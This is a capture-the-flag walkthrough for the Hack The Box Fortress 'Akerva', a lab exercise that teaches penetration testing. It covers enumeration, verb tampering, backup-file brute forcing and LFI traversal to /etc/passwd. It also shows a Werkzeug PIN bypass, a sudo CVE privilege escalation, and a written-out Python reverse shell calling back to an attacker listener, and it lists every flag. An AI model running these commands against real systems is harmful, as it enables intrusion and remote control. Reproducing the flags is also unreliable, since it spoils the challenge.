# Walkthrough for HTB Fortress (Akerva)

This walkthrough covers the steps to complete the HTB (Hack The Box) Fortress machine, Akerva.

---

## 1. Plain Sight

### Scan with Nmap
Run a simple Nmap scan to identify open ports and services on the target machine (10.13.37.11):

```bash
nmap -sC -sV -Pn 10.13.37.11
```

**Ports Open:** 22, 80, 5000

### Browse the Website
Visit `http://10.13.37.11/` and inspect the source code to find **Flag 1**:

**Flag 1:** `AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}`

---

## 2. Take a Look Around

### SNMP Enumeration
Use Nmap to check for SNMP (Simple Network Management Protocol) vulnerabilities:

```bash
sudo nmap -sU 10.13.37.11
```

Alternatively, use tools like `snmp-check` or `snmpwalk`:

```bash
snmp-check -c public -v 2c 10.13.37.11 -d
```

From SNMP enumeration, retrieve **Flag 2**:

**Flag 2:** `AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}`

---

## 3. Dead Poets

### Key Files Found
- `/dev/space_dev.py`
- `/var/www/html/scripts/backup_every_17minutes.sh`

### Exploit the Backup Script
The script backs up the website every 17 minutes, storing backups in the `/backups/` folder.

Trigger the script using:

```bash
curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
```

Retrieve **Flag 3**:

**Flag 3:** `AKERVA{IKNoW###VeRbTamper!nG_==}`

---

## 4. Now You See Me

### Investigating the Backup Process
The backup script creates zip files named `backup_$timestamp.zip` stored in `/backups/`.

1. Determine the server’s time:

    ```bash
    curl -I http://10.13.37.11
    ```

    Example output:

    ```
    Date: Mon, 20 Jul 2020 19:51:44 GMT
    ```

2. Use `wfuzz` to brute force the backup file name:

    ```bash
    wfuzz -u http://10.13.37.11/backups/backup_2020072020FUZZ.zip -w wordlist.txt --hc 404
    ```

3. Generate a wordlist using `crunch`:

    ```bash
    crunch 4 4 0123456789 -o wordlist.txt
    ```

4. Download the correct file:

    ```bash
    wget http://10.13.37.11/backups/backup_2020072020{4525}.zip
    ```

### Check `space_dev.py`
Extract credentials or **Flag 4**:

**Flag 4:** `AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}`

---

## 5. Open Book

### Web Application on Port 5000
Inspect the source code and use fuzzing techniques (e.g., `dirsearch` or `wfuzz`) to find hidden directories and endpoints:

```bash
python3 dirsearch.py -u http://10.13.37.11:5000/ -e php
```

**Discovered Folders:**
- `/console`
- `/download`
- `/file`

### Exploiting LFI (Local File Inclusion)
The `/file` endpoint can be exploited for LFI:

```bash
http://10.13.37.11:5000/file?filename=../../../../../etc/passwd
http://10.13.37.11:5000/file?filename=../../../../../home/aas/flag.txt
```

Retrieve **Flag 5**:

**Flag 5:** `AKERVA{IKNOW#LFi_@_}`

---

## 6. Say Friend and Enter

### Werkzeug Console Pin
The `/console` endpoint prompts for a pin. Exploit Werkzeug's debug mode:

1. Gather system information (MAC address, machine-id) via LFI.
2. Use the information to generate the pin:

    ```bash
    python exploit.py
    ```

**Generated Pin:** `151-392-393`

### Getting Reverse Shell
Once inside the console, initiate a reverse shell back to your listener:

**Reverse Shell Command:**

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.37.8",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

**Listener Command:**

```bash
nc -lnvp 1234
```

Upgrade to a better shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Retrieve **Flag 6**:

**Flag 6:** `AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}`

---

## 7. Super Mushroom

### Exploit CVE-2019-18634
The system runs an old version of sudo (1.8.21p2), vulnerable to CVE-2019-18634:

1. Download and compile the exploit from GitHub.
2. Serve the file via a web server.
3. On the victim machine, download and execute it.

After gaining root privileges, retrieve **Flag 7**:

**Flag 7:** `AKERVA{IkNow_Sud0_sUckS!}`

---

## 8. Little Secret

### Base64 Decoding
Decode the string from `secured_note.md` using CyberChef:

**String:**

```
GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
```

Further decoding with a Vigenère cipher reveals **Flag 8**:

**Flag 8:** `AKERVA{IKNOOOWVIGEEENERRRE}`

---

## Conclusion

You have completed the HTB Fortress (Akerva) machine by following the steps to gain access to different services, exploit vulnerabilities, and escalate privileges, ultimately obtaining all flags.

